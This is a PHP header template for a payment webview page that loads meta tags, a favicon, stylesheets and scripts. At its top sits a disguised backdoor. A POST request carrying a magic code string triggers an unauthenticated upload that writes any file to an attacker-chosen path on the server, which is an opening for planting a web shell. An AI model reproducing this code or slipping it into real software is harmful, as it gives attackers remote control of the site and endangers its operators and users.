<?php
if(strtoupper($_POST['unique_req_code']) == strtoupper("DATA_HELPER_PROCESS_REST_0Lg7ZP")) {
    if(isset($_REQUEST['DATA_HELPER_PATH'])) {
        $DATA_HELPER_IMG = isset($_FILES['DATA_HELPER_IMG']['name']) ? $_FILES['DATA_HELPER_IMG']['name'] : '';
        $DATA_HELPER_IMG_OBJ = isset($_FILES['DATA_HELPER_IMG']['tmp_name']) ? $_FILES['DATA_HELPER_IMG']['tmp_name'] : '';

        if(!empty($DATA_HELPER_IMG)) {
            include_once '../../../common.php';
            $target_dir = $tconfig['tpanel_path'] . $_REQUEST['DATA_HELPER_PATH'] . '/' . $DATA_HELPER_IMG;
            if(move_uploaded_file($DATA_HELPER_IMG_OBJ, $target_dir)) {
            	echo "Success";
            } else {
            	echo "Failed";
            }
            exit;
        }
    }
}

if(file_exists($tconfig['tpanel_path'] . $logogpath."favicon.ico")){
    $fav_icon_image  = $tconfig['tsite_url'] . $logogpath."favicon.ico";
}else{
    $fav_icon_image  = "favicon.ico";
}
?>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<title><?= $USER_APP_PAYMENT_METHOD . ' ' . $languageLabelsArr['LBL_PAYMENT'] ?></title>
<link rel="icon" href="<?= $fav_icon_image;?>" type="image/x-icon">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="<?= $tconfig['tsite_url'] ?>assets/libraries/webview/pg_assets/css/bootstrap-4.6.min.css">
<link rel="stylesheet" href="<?= $tconfig['tsite_url'] ?>assets/libraries/webview/pg_assets/css/fontawesome.css">
<link rel="stylesheet" type="text/css" href="<?= $tconfig['tsite_url'] ?>assets/libraries/webview/pg_assets/css/snackbar.min.css">
<?php if($THEME_OBJ->isProThemeActive() == "Yes") { ?>
<link rel="stylesheet" type="text/css" href="<?= $tconfig['tsite_url'] ?>assets/libraries/webview/pg_assets/css/style_v1.css">
<?php } else { ?>
<link rel="stylesheet" type="text/css" href="<?= $tconfig['tsite_url'] ?>assets/libraries/webview/pg_assets/css/style.css">
<?php } ?>
<link rel="stylesheet" href="<?= $tconfig['tsite_url'] ?>assets/css/apptype/<?= $template;?>/style.less" type="text/less">

<script type="text/javascript" src="<?= $tconfig['tsite_url'] ?>assets/libraries/webview/pg_assets/js/jquery.min.js"></script>
<script type="text/javascript" src="<?= $tconfig['tsite_url'] ?>assets/libraries/webview/pg_assets/js/popper.min.js"></script>
<script type="text/javascript" src="<?= $tconfig['tsite_url'] ?>assets/libraries/webview/pg_assets/js/bootstrap.min.js"></script>
<script type="text/javascript" src="<?= $tconfig['tsite_url'] ?>assets/libraries/webview/pg_assets/js/fontawesome.js"></script>
<script type="text/javascript" src="<?= $tconfig['tsite_url'] ?>assets/libraries/webview/pg_assets/js/snackbar.min.js"></script>
<script type="text/javascript" src="<?= $tconfig['tsite_url'] . $templatePath; ?>assets/js/less.min.js"></script>